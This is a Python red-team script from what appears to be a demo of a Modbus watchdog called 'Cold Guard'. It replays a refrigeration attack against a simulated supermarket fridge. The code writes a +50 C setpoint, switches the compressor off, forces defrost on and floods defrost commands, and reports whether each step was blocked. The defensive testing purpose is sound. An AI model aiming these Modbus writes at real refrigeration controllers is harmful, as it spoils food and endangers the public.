"""
Attacker — the rogue device on the store network. Runs on Daya's laptop.

This is the demo's red team. It recreates, against our OWN simulated fridge on
our OWN closed demo network, the publicly reported October 2026 supermarket
refrigeration attack: drive the setpoint to an unsafe temperature and force a
continuous defrost so the case warms up and the food spoils.

Its whole purpose is to be stopped: with Cold Guard armed, every step below is
blocked; in bypass mode they get through and the dashboard shows the case
climbing past the food-safety line. It targets only the addresses in
profile.json, on the demo network, and does nothing a normal Modbus client
can't do — the point is that the protocol trusts it, and the watchdog shouldn't.

Run:  python attacker.py            (reads profile.json for addresses)
"""

import json
import sys
import time

from pymodbus.client import ModbusTcpClient

PROFILE_PATH = sys.argv[1] if len(sys.argv) > 1 else "profile.json"
with open(PROFILE_PATH) as f:
    PROFILE = json.load(f)

HR_SETPOINT = 0
CO_COMPRESSOR = 0
CO_DEFROST = 1

DANGER_SETPOINT = 500   # +50.0 C in tenths — the headline from the real attack


def connect():
    host, port = PROFILE["listen"].rsplit(":", 1)
    if host == "0.0.0.0":
        host = "127.0.0.1"
    return ModbusTcpClient(host, port=int(port))


def step(label, fn):
    """Run one attack step and report whether the watchdog let it through."""
    result = fn()
    blocked = result.isError()
    mark = "BLOCKED" if blocked else "GOT THROUGH"
    print(f"  [{mark}] {label}")
    return blocked


def main():
    client = connect()
    if not client.connect():
        print("attacker: could not reach the target")
        return

    print("Attacker: replaying the supermarket refrigeration attack\n")

    # 1. Raise the setpoint to a spoilage temperature.
    step(f"set setpoint to {DANGER_SETPOINT/10:.0f}C",
         lambda: client.write_register(HR_SETPOINT, DANGER_SETPOINT & 0xFFFF))
    time.sleep(0.5)

    # 2. Turn the compressor off so nothing fights the warming.
    step("turn compressor OFF",
         lambda: client.write_coil(CO_COMPRESSOR, False))
    time.sleep(0.5)

    # 3. Force defrost on to actively heat the case.
    step("force defrost ON",
         lambda: client.write_coil(CO_DEFROST, True))
    time.sleep(0.5)

    # 4. Hammer defrost repeatedly — both a continuous-defrost push and a burst.
    print("\n  ...flooding defrost-on commands...")
    for _ in range(8):
        step("defrost ON (flood)", lambda: client.write_coil(CO_DEFROST, True))
        time.sleep(0.2)

    print("\nAttacker done. With Cold Guard armed, every line should read BLOCKED.")
    client.close()


if __name__ == "__main__":
    main()
